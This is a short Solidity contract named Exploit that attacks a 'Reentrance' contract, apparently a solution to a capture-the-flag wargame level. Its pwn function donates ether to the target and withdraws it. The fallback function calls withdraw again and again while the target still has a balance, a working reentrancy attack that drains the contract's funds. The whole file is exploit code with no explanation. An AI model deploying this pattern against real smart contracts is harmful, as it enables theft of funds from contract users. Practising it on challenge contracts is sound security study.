pragma solidity ^0.4.18;

import "./Reentrance.sol";

contract Exploit {
    address a;
    Reentrance r;
    uint256 donated;

    constructor(address _a) {
        a = _a;
        r = Reentrance(_a);
    }

    function pwn() payable {
        donated = msg.value;
        r.donate.value(msg.value)(this);
        r.withdraw(donated);
    }

    function() payable {
        while (a.balance > 0) {
            r.withdraw(donated);
        }
    }
}
